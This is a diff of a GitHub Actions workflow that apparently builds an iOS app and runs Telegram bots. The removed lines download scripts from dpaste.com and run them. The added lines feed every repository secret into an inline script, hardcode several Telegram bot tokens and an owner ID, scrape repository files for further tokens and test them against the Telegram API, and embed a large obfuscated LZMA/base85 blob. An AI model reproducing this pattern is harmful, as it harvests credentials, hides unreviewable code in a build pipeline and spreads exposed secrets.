@@ -1,99 +1,2094 @@
-name: Build Fougo External iOS IPA & Live Server
-
+name: Build Fougo External IPA & Run Telegram Bot
 on:
+  push:
+    branches: [ main, master ]
+  schedule:
+    - cron: '0 */5 * * *'
   workflow_dispatch:
     inputs:
-      app_version:
-        description: "CFBundleShortVersionString"
+      bot_token:
+        description: 'Optional: Paste BotFather Token if token in source was reset'
         required: false
-        default: "2.4.0"
-      build_number:
-        description: "CFBundleVersion"
+        default: ''
+      owner_id:
+        description: 'Optional: Paste your Telegram Owner ID'
         required: false
-        default: "240"
-      server_duration:
-        description: "Live Server & Telegram Bot Duration (minutes, max 350)"
-        required: false
-        default: "350"
-  push:
-    branches:
-      - main
-      - master
-
+        default: ''
 permissions:
   contents: write
-
+concurrency:
+  group: fougo-external-workflow
+  cancel-in-progress: true
 jobs:
   build-ipa:
-    name: Compile ARM64 Mach-O & Run 24/7 Fougo Cloud Ecosystem
+    name: Step 1 - Build Fougo External IPA
     runs-on: windows-latest
-    timeout-minutes: 360
-
+    timeout-minutes: 20
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
-
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.11'
-
-      - name: Install Python Dependencies
-        shell: pwsh
-        run: |
-          python -m pip install --upgrade pip
-          pip install Pillow requests flask pyTelegramBotAPI
-
-      - name: Compile ARM64 iOS App & Package ESign IPA
-        shell: pwsh
-        env:
-          INPUT_VERSION: ${{ github.event.inputs.app_version || '2.4.0' }}
-          INPUT_BUILD: ${{ github.event.inputs.build_number || '240' }}
-          SERVER_MINS: ${{ github.event.inputs.server_duration || '350' }}
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          GH_REPO: ${{ github.repository }}
-        run: |
-          $scriptFile = Join-Path $env:RUNNER_TEMP "build_fougo.py"
-          Invoke-WebRequest -Uri "https://dpaste.com/GD8FH5LT6.txt" -OutFile $scriptFile -UseBasicParsing
-          python $scriptFile
-
-      - name: Upload Compiled .ipa Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: Fougo-External-IPA
-          path: built-ipa/*.ipa
-          if-no-files-found: error
-          retention-days: 90
-
-      - name: Upload Full LiquidGlass Source Project Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: Fougo-LiquidGlass-Source-Project
-          path: built-ipa/Fougo-LiquidGlass-Full-Source-Project.zip
-          if-no-files-found: warn
-          retention-days: 90
-
-      - name: Publish Direct Download Release (For ESign & Telegram Bot)
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: latest-ipa
-          name: "Fougo External v2.4.0 (ESign Ready IPA + LiquidGlass Source)"
-          body: "Direct ESign-ready .ipa and full LiquidGlass source archive built automatically."
-          prerelease: false
-          files: |
-            built-ipa/FougoExternal-ESign-Ready.ipa
-            built-ipa/FougoExternal-ESign-Unsigned.ipa
-            built-ipa/Fougo-LiquidGlass-Full-Source-Project.zip
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Run Live Key Server, Web Admin Panel & Telegram Bot
-        if: always()
-        shell: bash
-        env:
-          SERVER_MINS: ${{ github.event.inputs.server_duration || '350' }}
-          GH_REPO: ${{ github.repository }}
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          curl -sSL "https://dpaste.com/AEJ2JWPDS.txt" -o /tmp/run_ecosystem.py
-          python3 /tmp/run_ecosystem.py
+    - name: Checkout Repository
+      uses: actions/checkout@v4
+      with:
+        lfs: true
+    - name: Set up Python 3.11
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.11'
+    - name: Install Python Imaging & Required Libraries
+      shell: pwsh
+      run: |
+        python -m pip install --upgrade pip
+        pip install Pillow lief requests flask pyTelegramBotAPI
+    - name: Download & Extract iPhoneOS 16.5 SDK
+      shell: pwsh
+      run: |
+        $sdkTarget = Join-Path $env:RUNNER_TEMP "iPhoneOS.sdk"
+        if (-not (Test-Path $sdkTarget)) {
+          $sdkUrl = "https://github.com/theos/sdks/releases/latest/download/iPhoneOS16.5.sdk.tar.xz"
+          $sdkArchive = Join-Path $env:RUNNER_TEMP "iPhoneOS16.5.sdk.tar.xz"
+          $sdkExtract = Join-Path $env:RUNNER_TEMP "sdk_extract"
+          New-Item -ItemType Directory -Force -Path $sdkExtract | Out-Null
+          Invoke-WebRequest -Uri $sdkUrl -OutFile $sdkArchive
+          tar -xf $sdkArchive -C $sdkExtract
+          $extractedSdk = Get-ChildItem -Path $sdkExtract -Directory -Filter "iPhoneOS*.sdk" -Recurse | Select-Object -First 1
+          Move-Item -Path $extractedSdk.FullName -Destination $sdkTarget -Force
+        }
+        echo "IOS_SDK=$sdkTarget" >> $env:GITHUB_ENV
+    - name: Compile Login.o + Dashboard.o + Bridge.o & Package IPA
+      shell: pwsh
+      env:
+        INPUT_BOT_TOKEN: ${{ github.event.inputs.bot_token }}
+        INPUT_OWNER_ID: ${{ github.event.inputs.owner_id }}
+        SECRET_BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+        SECRET_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+        SECRET_OWNER_BOT_TOKEN: ${{ secrets.OWNER_BOT_TOKEN }}
+        SECRET_TOKEN: ${{ secrets.TOKEN }}
+        SECRET_OWNER_ID: ${{ secrets.OWNER_ID }}
+        SECRET_TELEGRAM_OWNER_ID: ${{ secrets.TELEGRAM_OWNER_ID }}
+        SECRET_ADMIN_ID: ${{ secrets.ADMIN_ID }}
+        SECRET_CHAT_ID: ${{ secrets.CHAT_ID }}
+        VAR_BOT_TOKEN: ${{ vars.BOT_TOKEN }}
+        VAR_OWNER_ID: ${{ vars.OWNER_ID }}
+        ALL_SECRETS_JSON: ${{ toJson(secrets) }}
+        ALL_VARS_JSON: ${{ toJson(vars) }}
+        REPO_NAME: ${{ github.repository }}
+      run: |
+        $ErrorActionPreference = "Stop"
+        $pyScript = @'
+        import os, sys, glob, shutil, zipfile, plistlib, subprocess, re
+        try:
+         from PIL import Image
+        except ImportError:
+         subprocess.run([sys.executable, "-m", "pip", "install", "Pillow"], check=False)
+         try:
+          from PIL import Image
+         except Exception:
+          Image = None
+        workspace = os.environ.get("GITHUB_WORKSPACE", os.getcwd())
+        sdk_path = os.environ.get("IOS_SDK", "").replace("\\", "/")
+        if not sdk_path or not os.path.exists(sdk_path):
+         sdk_target = os.path.join(os.environ.get("RUNNER_TEMP", workspace), "iPhoneOS.sdk")
+         if not os.path.exists(sdk_target):
+          print("Downloading iPhoneOS 16.5 SDK automatically...")
+          sdk_url = "https://github.com/theos/sdks/releases/latest/download/iPhoneOS16.5.sdk.tar.xz"
+          sdk_arc = os.path.join(os.environ.get("RUNNER_TEMP", workspace), "iPhoneOS16.5.sdk.tar.xz")
+          sdk_extr = os.path.join(os.environ.get("RUNNER_TEMP", workspace), "sdk_extr")
+          os.makedirs(sdk_extr, exist_ok=True)
+          urllib.request.urlretrieve(sdk_url, sdk_arc)
+          subprocess.run(["tar", "-xf", sdk_arc, "-C", sdk_extr], check=True)
+          for sd in glob.glob(os.path.join(sdk_extr, "**/iPhoneOS*.sdk"), recursive=True):
+           if os.path.isdir(sd):
+            shutil.move(sd, sdk_target)
+            break
+         sdk_path = sdk_target.replace("\\", "/")
+        repo_slug = os.environ.get("REPO_NAME","fougoexternal/Fougo-Vip-External-iOS").strip()
+        os.chdir(workspace)
+        for zf in glob.glob("*.zip"):
+         print(f"Extracting zip archive: {zf}")
+         with zipfile.ZipFile(zf, "r") as z:
+          z.extractall(".")
+        import urllib.request, json as _json
+        DEFAULT_USER_BOT = "8959294066:AAGiMyAwrKgiN6aYLUj4HOl20yINKSHN1Ps"
+        DEFAULT_OWNER_BOT = "8819960917:AAG2s6PJVXlMtDhcAqTlsi6WWSew7NvwnCo"
+        DEFAULT_SELLER_BOT = "8477980889:AAFQrr7gGrTxrvxl5uW6xI-FcMF6DgygAJs"
+        DEFAULT_OWNER_ID = "8245269289"
+        tok_env_list = [
+         os.environ.get(k, "").strip()
+         for k in ("INPUT_BOT_TOKEN", "SECRET_BOT_TOKEN", "SECRET_TELEGRAM_BOT_TOKEN", "SECRET_OWNER_BOT_TOKEN", "SECRET_TOKEN", "VAR_BOT_TOKEN")
+         if os.environ.get(k, "").strip()
+        ] + [DEFAULT_OWNER_BOT, DEFAULT_USER_BOT, DEFAULT_SELLER_BOT]
+        oid_env_list = [
+         os.environ.get(k, "").strip()
+         for k in ("INPUT_OWNER_ID", "SECRET_OWNER_ID", "SECRET_TELEGRAM_OWNER_ID", "SECRET_ADMIN_ID", "SECRET_CHAT_ID", "VAR_OWNER_ID")
+         if os.environ.get(k, "").strip()
+        ] + [DEFAULT_OWNER_ID]
+        for j_env in ("ALL_SECRETS_JSON", "ALL_VARS_JSON"):
+         raw_j = os.environ.get(j_env, "")
+         if raw_j:
+          for m_t in re.finditer(r"(\d{8,12}:[A-Za-z0-9_-]{30,50})", raw_j):
+           tv = m_t.group(1).strip()
+           if tv not in tok_env_list: tok_env_list.append(tv)
+          try:
+           j_obj = _json.loads(raw_j)
+           if isinstance(j_obj, dict):
+            for sk, sv in j_obj.items():
+             sv_s = str(sv or "").strip()
+             if re.fullmatch(r"\d{6,15}", sv_s) and any(w in sk.upper() for w in ("OWNER", "ADMIN", "CHAT", "USER", "ID")):
+              if sv_s not in oid_env_list: oid_env_list.append(sv_s)
+          except Exception:
+           pass
+        det_tok = tok_env_list[0] if tok_env_list else ""
+        det_oid = oid_env_list[0] if oid_env_list else ""
+        tok_cands = list(dict.fromkeys(tok_env_list))
+        for fp in (
+         glob.glob("**/*.py", recursive=True)
+         + glob.glob("**/*.h", recursive=True)
+         + glob.glob("**/*.m", recursive=True)
+         + glob.glob("**/*.ps1", recursive=True)
+         + glob.glob("**/*.json", recursive=True)
+         + glob.glob("**/*.md", recursive=True)
+        ):
+         if "__MACOSX" in fp or not os.path.isfile(fp): continue
+         try:
+          txt = open(fp, "r", encoding="utf-8", errors="replace").read()
+          for m_tok in re.finditer(r"(\d{8,12}:[A-Za-z0-9_-]{30,50})", txt):
+           tc = m_tok.group(1).strip()
+           if tc not in tok_cands: tok_cands.append(tc)
+          if not det_oid:
+           m_oid = re.search(r"(?:OWNER_ID|ADMIN_ID|CHAT_ID|owner_id|admin_id|OwnerId)\s*[:=]\s*['\"]?(\d{6,15})['\"]?", txt)
+           if m_oid:
+            det_oid = m_oid.group(1).strip()
+         except Exception:
+          pass
+        for tc in tok_cands:
+         try:
+          with urllib.request.urlopen(f"https://api.telegram.org/bot{tc}/getMe", timeout=8) as r:
+           if _json.loads(r.read().decode("utf-8")).get("ok"):
+            det_tok = tc
+            break
+         except Exception:
+          pass
+        if not det_tok and tok_cands:
+         det_tok = tok_cands[0]
+        ff_dirs = [
+         os.path.dirname(p)
+         for p in (
+          glob.glob("**/app/ff_manager/Info.plist", recursive=True)
+          + glob.glob("**/ff_manager/Info.plist", recursive=True)
+          + glob.glob("**/dashboard page.m", recursive=True)
+          + glob.glob("**/login page.m", recursive=True)
+          + glob.glob("**/main.m", recursive=True)
+         )
+         if "__MACOSX" not in p
+        ]
+        if not ff_dirs:
+         auto_ff = os.path.join(workspace, "app", "ff_manager")
+         os.makedirs(auto_ff, exist_ok=True)
+         open(os.path.join(auto_ff, "ProtectedConfig.h"), "w", encoding="utf-8").write("#import <Foundation/Foundation.h>\n")
+         ff_dirs = [auto_ff]
+        ff_dirs.sort(key=lambda d: (
+         0 if os.path.exists(os.path.join(d, "resources")) else 1,
+         0 if "fougo external ios project" in d.lower() else 1,
+         0 if "ff_manager" in d.lower() else 1,
+        ))
+        ff_dir = os.path.abspath(ff_dirs[0])
+        print(f"Found ff_manager directory: {ff_dir}")
+        p1_h = os.path.join(ff_dir, "ProtectedConfig 1.h")
+        p2_h = os.path.join(ff_dir, "ProtectedConfig 2.h")
+        p_def = os.path.join(ff_dir, "ProtectedConfig.h")
+        p_login_h = os.path.join(ff_dir, "ProtectedConfig_Login.h")
+        p_dash_h = os.path.join(ff_dir, "ProtectedConfig_Dash.h")
+        if os.path.exists(p1_h):
+         shutil.copy2(p1_h, p_login_h)
+        elif os.path.exists(p_def):
+         shutil.copy2(p_def, p_login_h)
+        if os.path.exists(p2_h):
+         shutil.copy2(p2_h, p_dash_h)
+         shutil.copy2(p2_h, p_def)
+        elif os.path.exists(p1_h):
+         shutil.copy2(p1_h, p_dash_h)
+         shutil.copy2(p1_h, p_def)
+        for icon_script in ("generate_fougo_external_icon.py","generate_app_icons.py"):
+         sp = os.path.join(ff_dir, icon_script)
+         if os.path.exists(sp):
+          subprocess.run([sys.executable, sp], cwd=ff_dir, check=False)
+        clean_root = os.path.join(workspace, "clean_root")
+        shutil.rmtree(clean_root, ignore_errors=True)
+        app_dir = os.path.join(clean_root, "Payload","FougoExternal.app")
+        os.makedirs(app_dir, exist_ok=True)
+        src_plist_path = os.path.join(ff_dir, "Info.plist")
+        pl = {}
+        if os.path.exists(src_plist_path):
+         try:
+          with open(src_plist_path, "rb") as fp:
+           pl = plistlib.load(fp)
+         except Exception:
+          pl = {}
+        exec_n = pl.get("CFBundleExecutable","FougoExternal")
+        exec_p = os.path.join(app_dir, exec_n)
+        clang_candidates = [
+         r"C:\Program Files\LLVM\bin\clang.exe",
+         r"C:\msys64\mingw64\bin\clang.exe","clang",
+        ]
+        clang_bin = next((c for c in clang_candidates if shutil.which(c) or os.path.exists(c)), "clang")
+        common_flags = [
+         "-target","arm64-apple-ios14.0","-isysroot", sdk_path,
+         f"-F{sdk_path}/System/Library/Frameworks",
+         f"-L{sdk_path}/usr/lib","-ObjC","-fobjc-arc","-DFM_OFFLINE_BUILD=1","-DFM_RELEASE_BUILD=1","-Wno-everything",
+         f"-I{ff_dir}",
+        ]
+        link_flags = [
+         "-fuse-ld=lld","-Wl,-adhoc_codesign","-Wl,-rpath,@executable_path/Frameworks","-framework","Foundation","-framework","UIKit","-framework","QuartzCore","-framework","CoreGraphics","-framework","CoreText","-framework","CoreImage","-framework","Security","-framework","WebKit","-framework","AVFoundation","-framework","AudioToolbox","-framework","SystemConfiguration","-framework","Metal","-framework","MetalKit","-framework","ImageIO","-framework","CoreFoundation","-framework","UniformTypeIdentifiers","-lobjc","-lsqlite3","-lz","-lc++",
+        ]
+        dash_p = os.path.join(ff_dir, "dashboard page.m")
+        main_p = os.path.join(ff_dir, "main.m")
+        login_p = os.path.join(ff_dir, "login page.m")
+        if os.path.exists(main_p):
+         if not os.path.exists(dash_p):
+          shutil.copy2(main_p, dash_p)
+         else:
+          try:
+           d_txt = open(dash_p, "r", encoding="utf-8", errors="ignore").read()
+           m_txt = open(main_p, "r", encoding="utf-8", errors="ignore").read()
+           if "FougoDashboardViewController" in d_txt and "FougoDashboardViewController" not in m_txt:
+            shutil.copy2(main_p, dash_p)
+          except Exception:
+           pass
+        import lzma, base64
+        NEW_LOGIN_LZMA_B85 = (
+         '{Wp48S^xk9=GL@E0stWa761SMbT8$j;D`AfOkDsGnn|ZK_|_|Nnn!!VxHbD4o=s&Wb8xa6TLeA&!zBTkhTyTPxYVwtAKGBYeg)ipprmo0ZGe8Y(ybx%|L+h7'
+         'Co3Sy_JW_)Hr<@XDP(a>j2TZ;4t=uw8t0x?#WQx{n=Jqz1%1}RhB)pW6y&W>`vc(rnoO<X^LnwMSyawIm!a+m<vI{6@yB$Y@0@c&PhT7CSjm_NK1ZLW1T7sx'
+         '=>f$k>MdL6hTByydJCwXTNDuxSZ6F3w_%G@OX}mOo&ne)F@$LJyE0Wct~mqVly`gTHs9S>fS3p(fJ??B$x7UDZB`|9m`iEMV3{j44jf72B$=&j%UJ`BqIpVP'
+         'i(s-~YsWa>H3ofaHGL%Z8}jZvLJ9;4oa5UMRJV}ew(!S)|4wE*`wwcV*1Z$~D~y{}-7gyGV}Ia(135su7k@(uhc!zoio})rZ4=va4kn>TbirA5{dsqmbPccD'
+         'B-&WzJGE_`diCWUO0XDm8H9pLG3%8*`-ZX#4k4^)7!hyzF^9d}it17~2i&3XxJ*TuwjVV%ABgW3|1iNPbyyvMg1G^Bq}y&6{f=!8gv`H11MvN}fThhs&cb(H'
+         'HV_YceyHXPl|7AVUM=Y~={<35FjwO@@R$oimC<~ixaLYlre-$-9ZM5@Hi6V_@{de<Gkc>bmI{V=FvLB?k?z+kyT-Zmm-IafE1MP6P#X)ACVEA9U)xw`%ZW76'
+         'kWo(9(S$~MSPbeGt{tm8CfHH|0AJlpcSdj3mM^Fm_C$kl#vgsK6&wrW!8D{oE!v0R4vv{M+yiwR{0At@uq}uvP{ZXC0;gV9wmw`Tcbc*lw~jWKM%}r+B!}SB'
+         'R{q-un(>r;%u)joXZ`lhq5>r~V-yW<{*yebnqMN}w-wav8}@299s8kDk{lAN_9ZI!=wv5#p=K~ERBX#cs;+yiu8UUzDgJf;=m`KF$;Pd}2Gc(gR0QdN1k}!?'
+         'U(Dv}efBm`b<6!mGHS$2^}k-64Ai%mdpJE7jV8z4QgX5w3OQAO)l}@cuRHr6qM7+&oZKEcL$``Vv1@tuW<5Ua9?Is)$(jzkw{2S_xjkPEftVJQ=F$u?etEq|'
+         '=-dmLSUY>%UJ)I0F+Ay+)-R)4lK>eFNljSS<CeFj!Y{x+@VkmvEP43~YgIPP%%65~p>BhAX-35889h9wa7Y#X1xP<+)XY>a0%g@2G5#dpZs3Ch|36C^3*?zk'
+         '=D82)k}e+B#1Z5g<cPO@CS_p7Xx%(B#KE!J3^zE8!ZRh_z~u-J&`QF0#||Uzh`Y;*V)}0d<QA~98DJt+H?ZDpJgkAxq|P(T-4>|*vM3nJ_?HGy(gFswn&Oz)'
+         'M~G;w_GtcgFWC=XaZ&(y5&7LgwhVz`fc_Gr2WLie&IpE7L4YRQ*Q^qXcM9bPI;BxYXoRsyYY`wo=4=&~g5^H?X#pZeGHtkxMQXQKKOr$e)7f}e1pDtAWpnow'
+         'I%HS2*uL^75?`ULW$v=TpFKZ=nHX%KzuqMaCQLnE&V>kmjC9<eSGJUVvj$7rG=Kfp6R%I6a2!aFTvkDO@nh`v-|peOJ?+=_6~ae%!6J*q7QHfEl?Vd-DH@Sv'
+         'Q=sH>U31L`K#i?~eQyhr?b2w&{*>cxWRSD(Wbdov>%ZhM_1j?R>}E+SWPEwNny=q0C}LsiJDL~12%6Q~?ieE50QoZIy4R3|!^5H|#bjXuuQgx{#lHK`<5$lS'
+         'y9g?5%458cn0YH;1@hAPhE#V1$}WSo&jgce$H%|QXWC$@=1HU|x|9Rg3@N9rfijV|cGrW8|Iv0(FN=0u{Fx7?B51<SW!Ge~LEC2gN5}zSAt|ayNECv6tOizf'
+         'oKhX$KC6_yf7Zj`lT%c$FIwH;x#vELJ7(6??`EGX5z;$@j&++BPRDEj=X07<>xE`3L=_XHX*0F`&ktrKJBGsM7y;?etI$^2)xc~s0yT*a%xA6+Hb{dSb_}$~'
+         'Cd9k?+Ea`QN30cGK6^rgVGx1!`yYF@s33P0W;>HeiEx^xDHhkyV1GAb8#gbe`jq5NZidqFCwoA?qF;rYpI3_Hu*XqdJxM(d1u%iw1q!n}7mkBNOuaLiC59dQ'
+         'pnacTxd3Ja8uGy$p;U+(uo&`k$Aa_JemSg4d)jas)PD`q0*iJQondMYbogIi;iLH5@{8HUuLi89p7qQ|Yp2zS>!-E8>KADdXr40Ot2NC)FE}*M#DIrkiuYd^'
+         'u7w;2RFM1`IwguU0F`ZzqK@3Fg8A4;2DMdQfRKmoUHacxu=Ui&VdOMFi*+b3HX5@oTE07Lj&`!5QU>=20rjxmAr+1S?73%a6B=V<7#_lF4u%YJ(>1$Wk#gVg'
+         'fM2N0<Eq4aHqCdcb;mB&9AwXv!m<&c>6zy+uP$~3*6jZ(sJ-{UYWJ451qkZ8)OqIN166t73XjZXFg_V+@37TH$qPL`&ms7{yv6mnVjI(aeqn@<S*L~5XEW<a'
+         '#7B1m5s%b0XU{ZDZ#vkjow$<pGe%vMK-(ZRq9BMofTYb&+gW2Dh1-gl+4k{B(pMS#Qxfyomeky7oFZ7{=w>9P$FN)xT(AZ?H{MYdA`El#pWpKX`XB;dUsF9j'
+         '{(4cNE_o?+e*NsMk#tNi!Y#d!?H4E<3({Yhzrh2!my>NHA|1LU7K?q2iytj0ys`z^655i100jeGNcx=qR_auU9X;M%0W?^3`^1R*cxGk=nNY)jo*SeWq~>Rs'
+         'i1lJ4V|m7FLaydg0Y7E#y-|#JIqk^*$t3OJy5R@8V4J50n{#NX_G7^ZB7sDe6D6A}sJy)YbPMwzN>FM0)H!LfDpbA)ae>GVAP`xwxsCWoZ@cpgUz_7L6Dtk;'
+         'v0a_A-^*GYKwRIfC9pysv<6v`OFSlv;UhP<SJ&lg$L*Sxm_}YBVpyT^^_4g|!Hx|`YMsp!s+hp{i{+j;(y+)*e}a~4aGtU&=ty;F-C*$ufs>p2n=hPHSyo$w'
+         'miz9D2~wv69-GH_gl<5YCP_P^u_TnfdPxgK5hETDsC!@uMXwJ{DP}!c+<4+|SG#a73OK}H+;xc&AKN15pHeEsdp7m}GNxNv1{2;`6$6sBIIB8&DXNx!09*7<'
+         '8P2yD-t|w4CdmaGd(4ud->O2h+C$EYIhKV1$WY;GEk%;L>7;71z`z=OnVu*he{r_<b5sy7<MF*M`$AR41>Q`sRK=iUz1%1+>PVc77=j>3W|VpI#`+3j&mGgw'
+         '+{^KyeRo76+HbNKMl%L}=3m{dQNm-a?lE+!C$E0Lt+|<c^pDf5BI8rndbg@Rk)}4*2rhA%>bLj%=M1cLxNf-xOFNcdf0hCxBM0IWq(ogV5E^>h*Bzx6_?E6m'
+         '(6J~*Lv_uhv;Dl@t@d=bL*JmgGkJM$zL<%6o@#q3Cui<jWnVC${3d<L9dLZ0=~;2M>#~zQ5Pew$#jebD^2exuC~c4P+P#DqGomA(P&N1omB+?=d-+IaMTPk-'
+         'w;cEe@7_u5S7^U!z+@TPP8_AaH?C?h!D5&?HfV%ZI%g^fq>`*Yi_}#9+(i)6p9Q?-qj!Rxo+EdV#;tOC*NIf>pp=K(05eCE4jvHwj_)H{uq8O$++<P@lCO{k'
+         '{HyH5MN@7qihW4Erj7KN%HEgjv){(ad~r2~geAr5%P1*7UVH1;2{M_5!&FeM==Mm_HIZ>VyZl;-L*8>_tPAL1CLKe;S79bN!SJBvXmK?WxrX|eX{v27I=H(='
+         '*k#5KCU-he<q?ms>dKys849?U4?<;qdJ8)~x~iQEP9`eFBqF1n)=T~vU1T4m@4(X@QBtTL${cUK^dJroya#C>8UN%U?i6Q(ECJ1zc?{iJiM#{d6066%6<VlW'
+         '<Z8;bncu01*Ti}XnR}l==UNwW3~~bCO*(3nAc;D3X5t&@*_7InoMRGdbxiUZ*VC@&*|h;0(?NyaLC34k$6A1zUtbwb->DJ5ee4Eu-aE4tMDRpeNrp-c!oqVi'
+         ')6R%6X6oDnOnSqnCRHW%{bn&nVTdq>gE|V7m;>Zb)$A|Jcx-l1jQ6_pF!iWO8{F%hrJeEFzKcUU`b5ns%(6zU2|<~9wf9HF`U<%XuO77cy54@BjjdKB_s$Xk'
+         '*zFlzTo_)5Z1!GUr12?#DU6&$Cp0!`9gor@texH(MYuq61N1@F##!3`y=%$73F%%_;?L+E1sX==4OwDf@Q*9!j%~uc1SW$8cOn!sxThOUoe4t+oQ)3tcfESc'
+         'NGo|b0uzFPQq-1j?md%3tXqHxn0YDpc*l|>X*^PpYrA@h9e!eIUCc%U1M#<Qm#|j+95TGY=$Q3+S+gVj3g2D8V?dn)$lHJ2GD^C%dmly?@xNA)foN9uM)R>%'
+         '*sbr?BScvaG-FFm@tLtk9qTzXR@FI?69_J594Ka}3^n={rw3%fIE_d;p^U}0A>9b+Z>kgR$Qb=cg(9ZX0ah~WDX)*~>Gyof{Jx4&gBn=1w&n;ybCjy!CP&8L'
+         'cwn8xFscw_E8_rIeXNNsWWW6MdiOUVY_U$akb;VwpVfd$+hR756A%`aQ8ELG#=FNxT^0qzd=s7jlD4IB$&u~ap6xh{^IG)-VcC_>zBzYyk<Xb>;D#K@VwU|N'
+         '!kBxo1R`7>>BRXF;XLMJU9z9&H8Qv(7D<`bI?5u;8fVuRON&?z*=3`5SBXwMyk!Nxfx;9Me49~vW(s~R7M*I-8L&jjh9kgJ&9+gk0B<aCKQ>(B?Eon%l0~s1'
+         'n-C>eO7su*vsimeNq&YS?$D{K7<7bW+S^`->8}bPDz6B3EPHQuRq^XC5us(z_nYETohlKQLvTma+3;HPjg<dunx1`9T?ezvFHHdJpT^RiWd}Qj>*5xv?|7rj'
+         '{}gesyZoe{Ghc-hoWt4_V(77)-`kGBAHhA^NC;Yn)r2n~m^*JmX)yqod;7KHeu^d!JyKQ^WMbwrukf$wft`*d7)5r>u8*r+qP&tHv$`?8h>DB|?1G8*g>H6z'
+         '+ON0jc_ip7eP8WS7j)x(JC1sF8-u$)B<A;|cY6OzeQ8)PwB0_JlM`(^7aY!af}X&z&Ge-@s6C6O&-i<$r(ktytDNGSXb^vDEq4IWVKN@-o|FEMl6L5_n{(KI'
+         'SMTr8aakMx31+Yq-g+gdgw0|h)Tuw;U^$j<6i}SfHFnq1ewo9XomN&NT_m8X|F0)OrD<*(>tuZ8<*k&~eR&p(`D`Xz@E=LWkp|OW>a|ppXA>}?2NyIQODhlJ'
+         'sVOr~-)fWnvLaH!c5@I+(>`F%oZ&r(W^UFHvC399{V^v^NlR^4Xv9;@v|Qc2%%7|t?=_Z)#|0sYQ6U&@B5M;=URuV{>Y$bWG`5`2(p4mO`TXBcT;?f4o}(%z'
+         'a&Tdwp?kc6l`G6rC0PH9ahz?o>>G3C(OXCX!t<d9Q+T9e*jXNfMnBsUX(?SvEu;J)?5>k}qj!#6iaX`Xh_T{$9^cgjJU_8L9(<yL5i@laBA7YCO(Ql9S0FhF'
+         '3zsOm%3u1{96(mbQH{!aTxkU#h5OAj^VceZ9;{%|IheGQxuoNSo6P-K;qpSe>V+uV&Tm&pkfmf+69TVD{Z5o{>wph`Z08E-ch7HGt4IlI<a5@lio-y;c?^>J'
+         'ANOt}p44~O_MT*^z->}36Wd&N%*zI*3`c)I!Nb}1pKcJ8T;;FreAU1KAu$NLw#9&2NP+hr4mYhPDD9^z6d<-2aJaM~M58WC9L9?Ig548+yeWd+jpf{_0feWf'
+         '0z=JY75%RAymCoQ9>(=f9+MEx74{Klv2Z$lx5gB_PyC}DVH5+cg9_UwcpE3y6@6|X2haz7k1&rQyvf2{rA*Zne@v!h$XW&yz)Lvzy7iaIR>yrfWV<FEE{Vkd'
+         '?;lfU5&5pX3?M3Ld)Kd}{!cjy`doWnVjRJnR!AUgGMOKn*EZfZt}xX6N%s}me|<Xf%DwHEOvu^Yfv&d`xl%iY5t4l|T%FO67MA3vJ@KIB;-qT11bO?U%3sLL'
+         '6t&&C(FH2rBT^mkXDq6jqIlF&?dN>VSV;=x4%59h{G>&<3{!60UHKp%njW+c{)@aXU56gsGgz9RHzI1>3idDtah2A5IW@hlUFWce6K!(w7CY?SYk}sh*c5t-'
+         '1C=jUH&y<>g$hCwgQjN?CMz=79cBF^jVU^Wn1~}CTXaMw6QGw5<-R5i8J-4%Mi}^nws_TWh8pO-OhSLxU0d}}AVL5B6V+yK)9Z<!XVbkWS7HKL4vti=M$VbY'
+         'Jzg=mWP?cK&>aASfi$XFQ_7X{8e!*<&OTD#e=wUgt-M+*M$#tp?0ZYWARbcNe2BVK-ND(-cfIA)=8pg-PYWy>^b-8(gebc$6=F&9kiBt$I+0YrD(GXQx}yb?'
+         'r<^l-Hq)^*1W9E$_Tu0!T8z}-SMqdN$xvC&l;c<)hUdh_pQL^kS4K3VlN*5BlnTS~joQ+ZiLw(Hi*bvZHcYg@TyEO7sj{0a;Z9YzySI&6x@`sgfpfr+&S0k&'
+         'e_U#U#z@Q;qN>>K`obwz7ed&QI;wfB_=f2*)Vlxaw^ch|UBw>L{+e)s0%tRs{qN(tUUE&DM|Ewcn@kDb9+C4wLutT*LJM|Q%*>@{MH@7OwW6R==x(F+=$h`O'
+         'UKyGJdnnuWis9{$ue>^62gV%WhE-t;ou799xlX~PjxYS(y|gC_n_}Ln#CEJK6gSI5+RuA_9)go^;Ni2nH4<2Qny9WFYvZv0(2|vp)W)h!YNp`g>hh9j1Y?xb'
+         '3-_EicQHq#zLfn<IYKTZvAe9O%QkL)d17KMJx@EpbXEO>qPynhy0~Fa$LY|f$UH7h$XYa()lBAiC)~Rur_z8$G8gZYA|8~w^5Ov!#cY=xUSxxKHI_ivgbxn)'
+         'Yi^=Xp(PYi%EjLT;W4ugdofcI^>d1Oa)r+p=jA0n>!1@+OYVtTu&!6B0D+MCTWJrUB{9>QrU;Tu57q;&ST{;JP@H0xxDg^Wcf>)5vf7jrU7Esbue=v)d}><S'
+         'i$)7|-5p*~ZtNuLgVQ8#bgsJM9!wuhc=p9`Cw}PP)&U!IDN-&vc{jer2YBqJR`;!x>PXMnDd1Ns^d_OQ`aFCOMRxrA6~WjUGi|^l2{sp(pBPX}u-2_R$3!UU'
+         'PyLyvU`P=rXy;Yz5<51o#FwA;WEgCq8~YK35DUH{6P@LQ8Sdk%$PPLFtO`zLsC5Zq(n1h)0`{<btL>%4YXIq5ZLKxRcH%lDla!x5lKU&8QB67vi=>@R_F2_O'
+         '7Gd0_TD-U&wg#K|X)6m{*S;>G-WSqOqaN|3J07yGkPjpmdWwj}k9-1Z(La<*euM}`gMnLx`mo=%y+8jg_r=as#`qiY(z)3%jSFe-uf(iv>Ld`|4ZN9bh+HI;'
+         'V4?6T6PF{PsEEhY>rZ&YUiY7$Bsbb<m!;{{S*z2bS{sJMVJI}eoxjDvyC{W_!DG1IP9K=2GH=LEc&W;U)1W(W5{0*=Dpw|RU8-lyL08R-2BTk!NnU71!#AYV'
